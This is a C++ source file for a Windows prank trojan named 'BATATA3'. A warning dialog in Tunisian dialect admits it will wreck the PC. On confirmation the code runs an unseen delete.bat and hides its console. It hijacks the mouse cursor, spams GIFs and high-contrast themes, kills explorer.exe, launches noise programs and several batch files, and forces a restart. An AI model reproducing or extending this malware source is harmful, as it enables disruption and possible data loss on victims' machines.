#include "resource.h"
using namespace std;

void Stealth()
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth, 0);
}

void popups()
{
    system("<mybrowser> https://www.google.com/search?q=BATATA3&oq=BATATA3&aqs=chrome..69i57j0i5i30.1756j1j7&sourceid=chrome&ie=UTF-8");
    Sleep(5);
    system("<mybrowser> https://www.google.com/search?q=Hakuna+matata&oq=Hakuna+matata&aqs=chrome..69i57j0l3j0i395j46i395j0i395l2.95052j1j9&sourceid=chrome&ie=UTF-8");
    Sleep(5);
    system("<mybrowser> https://youtu.be/Ye5L3EUeEJM");
    Sleep(5);
    system("<mybrowser> https://youtu.be/S_xH7noaqTA");
    Sleep(4);
    system("<mybrowser> https://www.google.com/search?q=memz+virus&oq=memz+virus&aqs=chrome.0.0l2j0i22i30j69i60l3.3042j1j9&sourceid=chrome&ie=UTF-8");
    Sleep(4);
    system("<mybrowser> https://www.google.com/search?sxsrf=ALeKk037DN6DJ5o0Zz-tWOkO-RlthuxNLQ%3A1612283706360&ei=On8ZYN7IFY7YkwWg1ojADg&q=MY+PC+GOT+CRAZY&oq=MY+PC+GOT+CRAZY&gs_lcp=CgZwc3ktYWIQAzIECCMQJ1CTA1iTA2CEBWgAcAB4AIABwgGIAdICkgEDMC4ymAEAoAEBqgEHZ3dzLXdpesABAQ&sclient=psy-ab&ved=0ahUKEwjezeDs0MvuAhUO7KQKHSArAugQ4dUDCA0&uact=5");
    Sleep(3);
    system("<mybrowser> https://youtu.be/7J90CL-vRt8");
    Sleep(3);
    system("<mybrowser> https://youtu.be/6W5pq4bIzIw");
    Sleep(3);
    system("<mybrowser> https://youtu.be/G_p1YZLbM6E");
    Sleep(1);
    system("<mybrowser> https://youtu.be/mngydiyVLrg");
    Sleep(1);
    system("<mybrowser> https://www.instagram.com/foodporn/?hl=fr");
    Sleep(1);
    system("<mybrowser> https://www.google.com/search?q=resident+evil+8&oq=resident+evil+8&aqs=chrome..69i57j46i131i433j69i59j0i395l5.2139j1j4&sourceid=chrome&ie=UTF-8");


}
void bats()
{
    for (int i = 1; i <= 2; i++) {
        Sleep(3);
        system("start FFFF.bat");
        Sleep(3);
        system("start BBBB.Bat");
        Sleep(3);
        system("start AAAA.Bat");
        Sleep(3);
        system("start DDDD.Bat");
        Sleep(3);
        system("start CCCC.Bat");
        Sleep(3);
        system("start GGGG.Bat");
        Sleep(3);
        system("start EEEE.Bat");
    }
    
}
void wallpaperbyebye()
{


}
void everythingnormal()
{
    system(" cd C:\\Windows\\Resources\\themes ");
    system("start aero.theme");
}


void themes()
{

    system(" cd C:\\Windows\\Resources\\Ease of Access Themes");
    system("start hc1.theme");
    for (int i = 1; i <= 5; i++)
    {
        Sleep(5);
        system("start hc2.theme");
        Sleep(5);
        system("start hc1.theme");
        Sleep(5);
        system("start hcblack.theme");
        Sleep(5);
        system("start hcwhite.theme");
    }
}

void tsawer()
{

    for (int x = 1; x <= 10; x++)
    {
        Sleep(1);
        system("explorer batata3.Gif");
            Sleep(1);
        system("explorer batata32.Gif ");
            Sleep(1);
    }

}
int blaka2()
{
    int AA = MessageBox(
        NULL,
        (LPCWSTR)L"Hakuna Matata",
        (LPCWSTR)L"BATATA3 WARNING 2 ",
        MB_OKCANCEL | MB_ICONEXCLAMATION
    );



    return AA;
}


void lfichierO()
{
    ofstream MyFile("batata3.txt");
    MyFile << "YOU COMPUTER  BSH YWALLI BATATA\n \nTA3REF SHNOWA L BATATA ?  \n\nHEYA BSH TWALLI KHIR MEL PC MTE3K \n\nL BATATA TA3MEL BEHA FRITTES    \n\nPCEK BSH YWALLI BATATA YEBSA, YODHRBOU BEHA FIL 3ARKET \n\nENJOY ";

    MyFile.close();

}


void openlfich()
{
    system("start batata3.txt");

}
void CrazyMouse()
{
    int i = 1;
    while (i < 1000000)
    {
        int X = rand() % 801;
        int Y = rand() % 601;
        SetCursorPos(X, Y);
        i++;
    }

}

int blaka() {
    int msgboxID = MessageBox(
        NULL,
        (LPCWSTR)L"RAHO TROJAN METYAKED T7EB TJAREB ?.\r\n\Bsh yekhreblek l pc b kollo \n\n Ken just el testi \t jawek behii go ahead \n ama ken bsh t'executi aal main pc, \n AKHTAK TAKHTAK AKHTAAAK !\
Inzel YES ken metyaked \r\n\r\n\ rak ma2oull ala kol 7aja bsh tsri \n , bara have fun ay  ",
(LPCWSTR)L"BATATA3 WARNING",
MB_YESNO | MB_ICONWARNING
);
    if (msgboxID == IDYES)
    {
        system("start delete.bat");
        lfichierO();
        openlfich();
        Sleep(10);
        CrazyMouse();
      //  int y = blaka2();
     //   popups(); // Mahbtsh tkhdm
        Sleep(15);
        tsawer();
        Sleep(15);
        themes(); // to fix
        system("taskkill /f /IM explorer.exe");
        system("start noises.exe");
        bats();
        system("start explorer.exe"); // to fix 
        
        Sleep(3);
       // stopmusic();
        everythingnormal(); // to fix zeda 
        Sleep(10);
        system("shutdown -r");
        system("start noises2.exe");
        
        system("start image.bat");

        



    }
    return msgboxID;
}
